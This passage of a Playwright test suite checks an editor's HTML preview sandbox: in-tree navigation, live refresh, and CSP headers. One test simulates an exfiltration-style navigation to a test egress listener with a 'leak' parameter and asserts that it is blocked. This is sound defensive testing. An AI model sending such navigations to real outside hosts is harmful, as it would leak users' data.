    await expect(frame.locator('#title')).toHaveText('PAGE-2', { timeout: 15000 });
    expect(frame.url()).toContain('/api/preview/');
    expect(frame.url()).toContain(PAGE2_FILE);
    await expect(page.locator('[data-ext-modal]', { hasText: 'navigate away' })).toHaveCount(0);
    await expect(btn).toHaveClass(/active/);
    await expect.poll(async () => (await page.request.get(docUrl)).status(), { timeout: 5000 }).toBe(200);

    // Second hop: a page under a subdirectory.
    await frame.locator('#to-page3').click();
    await expect(frame.locator('#title')).toHaveText('PAGE-3', { timeout: 15000 });
    await expect(page.locator('[data-ext-modal]', { hasText: 'navigate away' })).toHaveCount(0);

    // Toggle off → code view restored.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    await expect(btn).not.toHaveClass(/active/);
  });

  test('scripts-on: in-tree JS navigation is allowed; cross-origin is still contained', async ({ page }) => {
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url();
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    await frame.evaluate(() => { window.location = 'page2.html'; });
    await expect(frame.locator('#title')).toHaveText('PAGE-2', { timeout: 15000 });
    await expect(page.locator('[data-ext-modal]', { hasText: 'navigate away' })).toHaveCount(0);
    await expect(btn).toHaveClass(/active/);
    await expect.poll(async () => (await page.request.get(docUrl)).status(), { timeout: 5000 }).toBe(200);

    // Cross-origin: the host CSP blocks the load in flight, then the watchdog
    // contains it (the nav record is still page2's).
    const egressBeforeNav = egressRequests.length;
    await frame.evaluate((nav) => { window.location = nav; }, `${egressBase}/nav?leak=scripts-on-in-tree-escape`);
    const modal = page.locator('[data-ext-modal]', { hasText: 'navigate away' });
    await expect(modal).toBeVisible({ timeout: 10000 });
    expect(egressRequests, 'blocked navigation must not reach the egress listener').toHaveLength(egressBeforeNav);
    await expect.poll(
        async () => (await page.request.get(docUrl)).status(),
        { timeout: 10000 },
    ).toBe(404);
    await modal.locator('button').click();
    await expect(modal).toHaveCount(0);
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
  });

  test('navigated sibling documents carry the doc CSP (posture preserved)', async ({ page }) => {
    // Strict posture: scripts on, network off.
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url();
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    // The navigated sibling's DOCUMENT response must carry the strict doc
    // CSP — a navigated page must not escape the doc's egress posture.
    const page2Response = page.waitForResponse(
        (resp) => resp.url().includes(PAGE2_FILE) && resp.request().resourceType() === 'document',
    );
    await frame.evaluate(() => { window.location = 'page2.html'; });
    const csp = (await page2Response).headers()['content-security-policy'] || '';
    expect(csp, 'navigated sibling doc carries the strict CSP').toContain("connect-src 'none'");
    expect(csp, 'no wildcard in any load-type directive').not.toMatch(
        /(script|style|img|font|media|frame|worker|object)-src[^;]*\*/);
    await expect(frame.locator('#title')).toHaveText('PAGE-2', { timeout: 15000 });
    await expect(page.locator('[data-ext-modal]', { hasText: 'navigate away' })).toHaveCount(0);

    // Non-document siblings keep the no-CSP behavior (unchanged). rel.css
    // lives in the doc's own dir (docUrl is the fixture dir under the token).
    const cssResp = await page.request.get(docUrl + REL_CSS_FILE);
    expect(cssResp.status()).toBe(200);
    expect(cssResp.headers()['content-security-policy'], 'sibling asset responses carry no doc CSP').toBeUndefined();

    // Flip allow_network, open a CLEAN page (the fixture's egress probes
    // would genuinely leave — the afterAll audit must stay green).
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: true } } });
    await openFile(page, [`html-preview-${TS}`, PAGE2_FILE]);
    await previewButton(page).click();
    const frameN = await previewFrameOf(page);
    await expect(frameN.locator('#title')).toHaveText('PAGE-2', { timeout: 15000 });
    const page3Resp = page.waitForResponse(
        (resp) => resp.url().includes('page3.html') && resp.request().resourceType() === 'document',
    );
    await frameN.evaluate(() => { window.location = 'sub/page3.html'; });
    const cspN = (await page3Resp).headers()['content-security-policy'] || '';
    expect(cspN, 'allow_network → permissive CSP on navigated docs').toContain('connect-src *');
    await expect(frameN.locator('#title')).toHaveText('PAGE-3', { timeout: 15000 });
    await previewButton(page).click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
  });

  test('scripts-on in-tree meta-refresh: same-tree navigation is allowed, no warning', async ({ page }) => {
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, REFRESH_IN_TREE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });
    await btn.click();
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('META-REFRESH-INTREE', { timeout: 10000 });

    // The 2s refresh navigates to page2.html — in-tree, so allowed.
    // Checked as a decision, because the two failures are different bugs: the title staying
    // META-REFRESH-INTREE means the refresh never fired; the title going null with a warning
    // modal means the extension contained the frame (its /nav lookup came back stale).
    await expect
        .poll(
            async () => ({
                title: await frame.locator('#title').textContent().catch(() => null),
                warned: await page.locator('[data-ext-modal]', { hasText: 'navigate away' }).count(),
            }),
            { message: 'in-tree meta-refresh must land on PAGE-2 with no containment warning', timeout: 20000 },
        )
        .toEqual({ title: 'PAGE-2', warned: 0 });
    await expect(btn).toHaveClass(/active/);

    // Toggle off → code view restored.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    await expect(btn).not.toHaveClass(/active/);
  });

  test('live refresh is paused while the preview is on another in-tree page', async ({ page }) => {
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: false, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });
    await btn.click();
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    await frame.locator('#to-page2').click();
    await expect(frame.locator('#title')).toHaveText('PAGE-2', { timeout: 15000 });

    // Edit the code view: the refresh must not yank the preview back to the
    // doc while the user is browsing.
    const newContent = HTML_FIXTURE.replace('HTML Preview Fixture', `LIVE-BROWSED-${TS}`);
    await page.evaluate((content) => {
      const cm = document.querySelector('.file-editor.active .cm-editor') as any;
      cm.__view.dispatch({ changes: { from: 0, to: cm.__view.state.doc.length, insert: content } });
    }, newContent);
    // Well past the 300ms debounce: still on page2.
    await page.waitForTimeout(1000);
    await expect(frame.locator('#title')).toHaveText('PAGE-2');

    // Self-reference link back to the doc (serves the stored content), then
    // edit: refresh works again.
    await frame.locator('#to-index').click();
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });
    const backContent = HTML_FIXTURE.replace('HTML Preview Fixture', `LIVE-BACK-${TS}`);
    await page.evaluate((content) => {
      const cm = document.querySelector('.file-editor.active .cm-editor') as any;
      cm.__view.dispatch({ changes: { from: 0, to: cm.__view.state.doc.length, insert: content } });
    }, backContent);
    await expect.poll(() => previewTitle(page), { timeout: 15000 }).toContain(`LIVE-BACK-${TS}`);

    // Toggle off and drop the persisted editor draft so later tests open clean.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    const filePath = join(FIXTURE_DIR, PAGE_FILE);
    await page.evaluate(async (path) => {
      return new Promise<void>((resolve) => {
        const req = indexedDB.open('kanban-storage', 3);
        req.onsuccess = () => {
          const tx = req.result.transaction('editor-drafts', 'readwrite');
          tx.objectStore('editor-drafts').delete(path);
          tx.oncomplete = () => resolve();
          tx.onerror = () => resolve();
        };
        req.onerror = () => resolve();
      });
    }, filePath);
  });

  test('task view: on-disk changes (e.g. agent writes) refresh the preview live', async ({ page }) => {
    test.setTimeout(90000);
    await page.goto('/');
    await page.waitForSelector('.project-item', { timeout: 10000 });
    // Same identity rule as openFile: this spec's fixtures live in the TEST_REPO
    // project, not in "whichever project happens to be first".
    const { id: projectId } = await testRepoProject(page);
    expect(projectId, `project for ${TEST_REPO} exists`).not.toBe('');
    // Own task (not the shared global-setup ones) — moved back to backlog in finally.
    const taskId = await createTaskViaApi(page, projectId, `preview live ${TS}`);
    let worktreeDir = '';
    try {
      // Start the task so the executor creates the worktree; wait for the branch.
      await ensureTaskStarted(page, projectId, taskId);
      await expect(async () => {
        const t = await getTaskData(page, projectId, taskId);
        expect(t.branch).toBeTruthy();
      }).toPass({ timeout: 30000 });

      // Write an HTML fixture into the worktree (like an agent would).
      worktreeDir = await getWorktreeDir(page, projectId, taskId);
      const absDir = join(worktreeDir, `preview-live-${TS}`);
      const absFile = join(absDir, 'index.html');
      mkdirSync(absDir, { recursive: true });
      writeFileSync(absFile, TASK_FIXTURE('V1'));

      // Open the task view; the untracked fixture must appear in the diff column.
      await navigateToTask(page, taskId, projectId);
      const fileSection = page.locator('.diff-file-section', { hasText: `preview-live-${TS}` });
      await expect(fileSection).toBeVisible({ timeout: 30000 });

      // Open the editor from a diff row and start the preview.
      await fileSection.locator('.diff-row-clickable').first().click();
      await expect(page.locator('.file-editor .cm-editor')).toBeVisible({ timeout: 15000 });
      const btn = page.locator('.file-editor .ext-footer-btn', { hasText: 'Preview' });
      await expect(btn).toBeVisible({ timeout: 10000 });
      await btn.click();
      await expect(page.locator('.file-editor .editor-wrapper')).toHaveCSS('display', 'none', { timeout: 10000 });
      const frame = await previewFrameOf(page);
      await expect(frame.locator('#title')).toHaveText('TASK-PREVIEW-V1', { timeout: 15000 });

      // External (agent/terminal) write to the worktree file.
      writeFileSync(absFile, TASK_FIXTURE('V2'));
      // (a) The diff-mode code view reconciles the on-disk content...
      await expect.poll(() => page.evaluate(() => {
        const cm = document.querySelector('.file-editor .cm-editor') as any;
        return cm ? cm.__view.state.doc.toString() : '';
      }), { timeout: 20000 }).toContain('TASK-PREVIEW-V2');
      // (b) ...and the preview mirrors it.
      await expect.poll(() => previewTitle(page), { timeout: 20000 }).toContain('TASK-PREVIEW-V2');
    } finally {
      try { rmSync(join(worktreeDir, `preview-live-${TS}`), { recursive: true, force: true }); } catch { /* ignore */ }
      // Return the task to backlog (stops the executor; keeps shared board helpers stable).
      await csrfFetch(page, `/api/projects/${projectId}/tasks/${taskId}/move`, {
        method: 'POST',
        body: { status: 'backlog' },
      });
    }
  });
});
